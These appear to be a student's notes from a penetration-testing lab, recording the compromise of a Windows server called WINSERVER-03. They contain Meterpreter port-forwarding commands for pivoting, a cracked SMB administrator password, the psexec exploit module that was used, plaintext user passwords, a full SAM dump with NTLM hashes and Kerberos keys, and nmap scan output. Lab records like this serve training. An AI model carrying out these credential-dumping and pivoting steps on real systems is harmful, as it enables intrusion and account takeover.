## flag.txt
2ebff64df4bf470eacb0895c64f73765



# Pivoting:

	meterpreter > portfwd add -l 8080 -p 80 -r 192.168.0.50

Other port:

	meterpreter > portfwd add -l 8800 -p 51265 -r 192.168.0.50



# **192.168.100.55 WINSERVER-03:**

## **SMB Password:**
[445][smb] host: 192.168.100.55   login: administrator   password: swordfish

Exploit used:

	exploit/windows/smb/psexec

mary:hotmama
lawerence:computadora
# **SAM Hash Dump:**

	meterpreter > lsa_dump_sam 
	[+] Running as SYSTEM
	[*] Dumping SAM
	Domain : WINSERVER-03
	SysKey : 377af0de68bdc918d22c57a263d38326
	Local SID : S-1-5-21-3688751335-3073641799-161370460
	
	SAMKey : 858f5bda5c99e45094a6a1387241a33d
	
	RID  : 000001f4 (500)
	User : Administrator
	  Hash NTLM: 61fb34469b9989b01be4e8630c52eed6
	
	Supplemental Credentials:
	* Primary:NTLM-Strong-NTOWF *
	    Random Value : 175efbb78f36bf76ccff7a9b7b5d95e3
	
	* Primary:Kerberos-Newer-Keys *
	    Default Salt : WINSERVER-03Administrator
	    Default Iterations : 4096
	    Credentials
	      aes256_hmac       (4096) : f79e74b4197b479c982426c1e5eef127c4bbcb39c2cdb918684611957380847b
	      aes128_hmac       (4096) : 9898be3f664b9195b9cf4c9dcb024cb5
	      des_cbc_md5       (4096) : 327f1f5462d6254f
	    OldCredentials
	      aes256_hmac       (4096) : 69d101a02f3f4648bf9875f10c1cd268d3f500c3253ab862222a9e1bb3740247
	      aes128_hmac       (4096) : 3c3fd899f7f004ed44e9e48f868a5ddc
	      des_cbc_md5       (4096) : 9b808fb9e0cbb3b5
	    OlderCredentials
	      aes256_hmac       (4096) : 4cbbe8ad8482ca76952b08cd9103ba91af35c9d8b21a3d49c332e072618a9fa9
	      aes128_hmac       (4096) : b18addd75f8a2b106b262c7b5e517623
	      des_cbc_md5       (4096) : 7fe0c2a15eb32fcd
	
	* Packages *
	    NTLM-Strong-NTOWF
	
	* Primary:Kerberos *
	    Default Salt : WINSERVER-03Administrator
	    Credentials
	      des_cbc_md5       : 327f1f5462d6254f
	    OldCredentials
	      des_cbc_md5       : 9b808fb9e0cbb3b5
	
	
	RID  : 000001f5 (501)
	User : Guest
	
	RID  : 000001f7 (503)
	User : DefaultAccount
	
	RID  : 000001f8 (504)
	User : WDAGUtilityAccount
	  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1
	
	Supplemental Credentials:
	* Primary:NTLM-Strong-NTOWF *
	    Random Value : a1528cd40d99e5dfa9fa0809af998696
	
	* Primary:Kerberos-Newer-Keys *
	    Default Salt : WDAGUtilityAccount
	    Default Iterations : 4096
	    Credentials
	      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
	      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
	      des_cbc_md5       (4096) : ce9b2cabd55df4ce
	
	* Packages *
	    NTLM-Strong-NTOWF
	
	* Primary:Kerberos *
	    Default Salt : WDAGUtilityAccount
	    Credentials
	      des_cbc_md5       : ce9b2cabd55df4ce
	
	
	RID  : 000003f0 (1008)
	User : student
	  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b
	
	Supplemental Credentials:
	* Primary:NTLM-Strong-NTOWF *
	    Random Value : b8e5edf45f3a42335f1f4906a24a08fe
	
	* Primary:Kerberos-Newer-Keys *
	    Default Salt : EC2AMAZ-R69684Tstudent
	    Default Iterations : 4096
	    Credentials
	      aes256_hmac       (4096) : bab064fdaf62216a1577f1d5cd88e162f6962b4a421d199adf4c66b61ec6ac7c
	      aes128_hmac       (4096) : 42bc1d17d1236d3afc09efbeba547d2c
	      des_cbc_md5       (4096) : 1a975b02a7bf15d5
	
	* Packages *
	    NTLM-Strong-NTOWF
	
	* Primary:Kerberos *
	    Default Salt : EC2AMAZ-R69684Tstudent
	    Credentials
	      des_cbc_md5       : 1a975b02a7bf15d5
	
	
	RID  : 000003f1 (1009)
	User : lawrence
	  Hash NTLM: 18aa104784f77431563b1a1b67f6096c
	
	Supplemental Credentials:
	* Primary:NTLM-Strong-NTOWF *
	    Random Value : d47a0d418061ab659eb47f78ffc1a916
	
	* Primary:Kerberos-Newer-Keys *
	    Default Salt : ATTACKDEFENSElawrence
	    Default Iterations : 4096
	    Credentials
	      aes256_hmac       (4096) : ffabfc3e4d7d04e52fafb019c76efeed2053918f04671b089914c561e2a6bb63
	      aes128_hmac       (4096) : 2b90e009c55e8a47d5152d312a3a4237
	      des_cbc_md5       (4096) : c4f216ade30d6bf8
	
	* Packages *
	    NTLM-Strong-NTOWF
	
	* Primary:Kerberos *
	    Default Salt : ATTACKDEFENSElawrence
	    Credentials
	      des_cbc_md5       : c4f216ade30d6bf8
	
	
	RID  : 000003f2 (1010)
	User : mary
	  Hash NTLM: 11637a16fca11b3604e3e68d5221b3c7
	
	Supplemental Credentials:
	* Primary:NTLM-Strong-NTOWF *
	    Random Value : ee979652bb73e3ee6c33d922d8751167
	
	* Primary:Kerberos-Newer-Keys *
	    Default Salt : ATTACKDEFENSEmary
	    Default Iterations : 4096
	    Credentials
	      aes256_hmac       (4096) : 63fe378d126a59690352759fabc9a0b0d33f358b8be01e11384e53c744364476
	      aes128_hmac       (4096) : e476c63c7cbe031dc164e5edc88a8480
	      des_cbc_md5       (4096) : 401c01c78926a192
	
	* Packages *
	    NTLM-Strong-NTOWF
	
	* Primary:Kerberos *
	    Default Salt : ATTACKDEFENSEmary
	    Credentials
	      des_cbc_md5       : 401c01c78926a192
	
	
	RID  : 000003f3 (1011)
	User : admin
	  Hash NTLM: 0f2011271b98907e6d288066567d3319
	
	Supplemental Credentials:
	* Primary:NTLM-Strong-NTOWF *
	    Random Value : e07aba42f9788f66fb938f66349cb81b
	
	* Primary:Kerberos-Newer-Keys *
	    Default Salt : ATTACKDEFENSEadmin
	    Default Iterations : 4096
	    Credentials
	      aes256_hmac       (4096) : 291868e6ee1a9810353c320bbade3146e554fa7336efedc0cdeebe6a4393755a
	      aes128_hmac       (4096) : 9bad45cbc794bcbc5ae463726550f1f1
	      des_cbc_md5       (4096) : dce6986e9d6240e0
	
	* Packages *
	    NTLM-Strong-NTOWF
	
	* Primary:Kerberos *
	    Default Salt : ATTACKDEFENSEadmin
	    Credentials
	      des_cbc_md5       : dce6986e9d6240e0
	
	



# **Internal Network:**

	meterpreter > ipconfig 
	
	Interface  1
	============
	Name         : Software Loopback Interface 1
	Hardware MAC : 00:00:00:00:00:00
	MTU          : 4294967295
	IPv4 Address : 127.0.0.1
	IPv4 Netmask : 255.0.0.0
	IPv6 Address : ::1
	IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
	
	
	Interface  2
	============
	Name         : Amazon Elastic Network Adapter
	Hardware MAC : 06:23:e7:75:73:a7
	MTU          : 1500
	IPv4 Address : 192.168.100.55
	IPv4 Netmask : 255.255.255.0
	IPv6 Address : fe80::f16c:bca6:f654:a0d4
	IPv6 Netmask : ffff:ffff:ffff:ffff::
	
	
	Interface 27
	============
	Name         : Amazon Elastic Network Adapter #2
	Hardware MAC : 06:5e:fa:c5:1b:3b
	MTU          : 1500
	IPv4 Address : 192.168.0.50
	IPv4 Netmask : 255.255.255.0
	IPv6 Address : fe80::5887:5792:523:b5df
	IPv6 Netmask : ffff:ffff:ffff:ffff::
	
	

# **Open Ports:**

	PORT      STATE SERVICE       REASON
	80/tcp    open  http          syn-ack ttl 128
	135/tcp   open  msrpc         syn-ack ttl 128
	139/tcp   open  netbios-ssn   syn-ack ttl 128
	445/tcp   open  microsoft-ds  syn-ack ttl 128
	3389/tcp  open  ms-wbt-server syn-ack ttl 128
	5985/tcp  open  wsman         syn-ack ttl 128
	47001/tcp open  winrm         syn-ack ttl 128
	49664/tcp open  unknown       syn-ack ttl 128
	49665/tcp open  unknown       syn-ack ttl 128
	49666/tcp open  unknown       syn-ack ttl 128
	49667/tcp open  unknown       syn-ack ttl 128
	49668/tcp open  unknown       syn-ack ttl 128
	49669/tcp open  unknown       syn-ack ttl 128
	49670/tcp open  unknown       syn-ack ttl 128
	49671/tcp open  unknown       syn-ack ttl 128




# **Services on open ports:**

	PORT     STATE SERVICE       REASON          VERSION
	80/tcp   open  http          syn-ack ttl 128 Microsoft IIS httpd 10.0
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows Server
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	135/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
	139/tcp  open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds  syn-ack ttl 128 Windows Server 2019 Datacenter 17763 microsoft-ds
	3389/tcp open  ms-wbt-server syn-ack ttl 128 Microsoft Terminal Services
	|_ssl-date: 2025-05-30T16:10:28+00:00; 0s from scanner time.
	| ssl-cert: Subject: commonName=WINSERVER-03
	| Issuer: commonName=WINSERVER-03
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2025-05-29T15:30:49
	| Not valid after:  2025-11-28T15:30:49
	| MD5:   6e50 9a6a 45a1 7d89 3b26 0a75 58f8 9f29
	| SHA-1: 8b0d 7886 6dea 56ff aade 1fd7 afce c916 a2f1 9bf9
	| -----BEGIN CERTIFICATE-----
	| MIIC3DCCAcSgAwIBAgIQUGUHxkBQSplFK+lhN8fa6zANBgkqhkiG9w0BAQsFADAX
	| MRUwEwYDVQQDEwxXSU5TRVJWRVItMDMwHhcNMjUwNTI5MTUzMDQ5WhcNMjUxMTI4
	| MTUzMDQ5WjAXMRUwEwYDVQQDEwxXSU5TRVJWRVItMDMwggEiMA0GCSqGSIb3DQEB
	| AQUAA4IBDwAwggEKAoIBAQDTrciJ4GvN6lD0S+tX0aCqz10R6tAHTwbLczL/s/J0
	| siVQrfhiW8H6XHKaDF5my0Senbi87wFkaoflQfMtxbehG3o1MgNWf11KOM4SlxV9
	| io70zV0uuEJ8kJcnXevHlprCFnAs5e4giXYvi71RtiF4rsAl55upXhjT/Gehc/p7
	| 4pyPVuVqwuFlLB19Txhu1y2ZDfhqGXzHOVlTsYgzlYE7FsQNJO0E5mdRqczsdVDZ
	| sLuO/l449juoce/Ma1zBWshBhDezgNERMNLEqpPnRnzTvNRP6h6uBkd5VwBA5UXh
	| HGem8VMJN4hkYuXmKXCiUO/ckKn7n8ZBSRsrBIsrU/RtAgMBAAGjJDAiMBMGA1Ud
	| JQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEA
	| uie3kSkiYhJdj2bnzapaTcrsATavr75rwZQnWg7u1duua25LVyVgXagDqx68jqqo
	| ZL0RMcp/M6P0k8PNc7sxgKAKB27ivoUugXoU9pab9u1XNYG/jbrsBQrCbr1AnMWA
	| UCNuIOYcuAmfgdgHTnV616EPfeu8+Q0pmTVVN5BjKqf4Hvrw2qMjZfO6E3Pbdn+q
	| k99AmF9Kw82onM38vRvTPdDJO1vd+L3ro9nkTv4BSBRzoFUg5m0p5hOxfyC1Zkxa
	| 7HKG2mkmL9knILgJHz+Pf+pkgBMKPRkUOwuQEZUZYTHp6G4TEw4Hx0o4YOAEXCYy
	| 6d2kteQTsEvCw+XdfHvm+g==
	|_-----END CERTIFICATE-----
	| rdp-ntlm-info: 
	|   Target_Name: WINSERVER-03
	|   NetBIOS_Domain_Name: WINSERVER-03
	|   NetBIOS_Computer_Name: WINSERVER-03
	|   DNS_Domain_Name: WINSERVER-03
	|   DNS_Computer_Name: WINSERVER-03
	|   Product_Version: 10.0.17763
	|_  System_Time: 2025-05-30T16:10:23+00:00
	5985/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	47001/tcp open  http    syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	


